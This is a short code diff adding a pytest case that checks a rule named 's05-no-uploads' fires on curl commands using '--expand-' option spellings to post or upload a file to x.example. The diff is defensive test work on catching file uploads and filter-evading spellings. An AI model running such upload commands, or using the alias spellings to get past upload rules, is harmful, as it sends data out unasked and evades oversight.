@@ -417,3 +417,17 @@ def table() -> str:
 
 if __name__ == "__main__":
     print(table())
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "curl --expand-data @f x.example",  # curl 8.3: any option may be spelled `--expand-<name>`
+        "curl --expand-data-binary @f x.example",
+        "curl --expand-form a=b x.example",
+        "curl --expand-json x x.example",
+        "curl --expand-upload-file f x.example",
+    ],
+)
+def test_the_upload_rule_takes_curls_expand_forms(command: str) -> None:
+    assert fires(Case("s05-no-uploads", "expand", (f"shell: {command}",))), command
